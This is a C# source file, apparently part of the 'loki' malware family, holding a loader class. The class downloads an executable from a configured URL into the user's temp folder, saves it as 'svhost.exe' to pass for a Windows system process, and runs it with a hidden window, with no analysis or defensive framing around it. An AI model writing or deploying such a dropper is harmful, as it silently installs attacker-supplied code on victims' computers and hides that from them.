using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace loki.loki.Utilies;

internal class loader
{
	public static void load()
	{
		string tempPath = Path.GetTempPath();
		Download(tempPath, Settings.url_loader);
		RunProcess(tempPath);
	}

	private static void RunProcess(string FileLocating)
	{
		Process process = new Process
		{
			StartInfo = 
			{
				FileName = FileLocating + "svhost.exe",
				WindowStyle = ProcessWindowStyle.Hidden
			}
		};
		process.Start();
	}

	private static void Download(string FileLocating, string url)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri(url), FileLocating + "\\svhost.exe");
	}
}
